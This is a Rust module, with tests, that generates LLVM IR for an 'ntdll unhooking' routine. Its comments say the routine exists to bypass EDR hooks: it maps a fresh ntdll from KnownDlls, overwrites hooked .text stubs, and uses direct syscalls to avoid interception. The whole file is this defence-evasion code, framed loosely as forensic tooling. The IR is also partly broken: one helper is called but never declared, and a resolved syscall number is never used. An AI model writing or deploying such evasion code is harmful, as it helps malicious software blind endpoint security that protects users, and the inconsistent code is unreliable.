/// NTDLL unhooking via fresh mapping.
///
/// EDRs install user-mode hooks by patching the first bytes of ntdll
/// export stubs with a JMP to their inspection code.  We bypass this by:
///   1. Opening `\KnownDlls\ntdll.dll` as a section object (no file I/O).
///   2. Mapping a private copy of the `.text` section.
///   3. Copying clean stubs from the fresh copy over the hooked copies.
///
/// This module emits the LLVM IR for the unhooking function, called once
/// at session start.  The actual syscalls to do this use the direct-syscall
/// stubs so EDRs cannot intercept the unhooking itself.

pub struct NtdllUnhooker;

impl NtdllUnhooker {
    /// Emit LLVM IR for the `jocky_unhook_ntdll` function body.
    /// The function is called once at forensic session init.
    pub fn emit_ir() -> String {
        r#"; ============================================================
; jocky_unhook_ntdll — map fresh ntdll, restore .text stubs
; ============================================================
define void @jocky_unhook_ntdll() {
entry:
  ; Step 1: resolve NtOpenSection SSN via jocky_resolve_ssn
  %ssn_hash_open = add i64 0, 7956321048127643
  %ssn_open = call i32 @jocky_resolve_ssn(i64 %ssn_hash_open)

  ; Step 2: open \KnownDlls\ntdll.dll section
  %section_handle = call i8* @jocky_open_knowndlls_ntdll()

  ; Step 3: map the fresh .text section
  %clean_base = call i8* @jocky_map_section(i8* %section_handle)

  ; Step 4: locate current ntdll .text base in this process
  %hooked_base = call i8* @jocky_get_ntdll_text_base()

  ; Step 5: copy clean bytes over hooked bytes
  %text_size = call i64 @jocky_get_ntdll_text_size(i8* %clean_base)
  call void @jocky_copy_text_section(
    i8* %clean_base,
    i8* %hooked_base,
    i64 %text_size
  )

  ; Step 6: unmap and close
  call void @jocky_unmap_section(i8* %clean_base)
  call void @jocky_close_handle(i8* %section_handle)

  ret void
}
"#.to_string()
    }

    /// Emit declarations for all runtime helpers used by the unhooker.
    pub fn emit_declarations() -> String {
        r#"declare i8*  @jocky_open_knowndlls_ntdll()
declare i8*  @jocky_map_section(i8*)
declare i8*  @jocky_get_ntdll_text_base()
declare i64  @jocky_get_ntdll_text_size(i8*)
declare void @jocky_copy_text_section(i8*, i8*, i64)
declare void @jocky_unmap_section(i8*)
declare void @jocky_close_handle(i8*)
"#.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_emit_ir_is_valid_start() {
        let ir = NtdllUnhooker::emit_ir();
        assert!(ir.contains("define void @jocky_unhook_ntdll"), "function definition required");
        assert!(ir.contains("jocky_copy_text_section"), "copy step required");
        assert!(ir.contains("ret void"), "function must return");
    }

    #[test]
    fn test_emit_declarations_nonempty() {
        let decls = NtdllUnhooker::emit_declarations();
        assert!(!decls.is_empty());
        assert!(decls.contains("declare"), "must emit declare statements");
    }

    #[test]
    fn test_full_preamble_composes() {
        let preamble = format!("{}\n{}", NtdllUnhooker::emit_declarations(), NtdllUnhooker::emit_ir());
        assert!(preamble.contains("@jocky_unhook_ntdll"), "composed preamble must have function");
    }
}
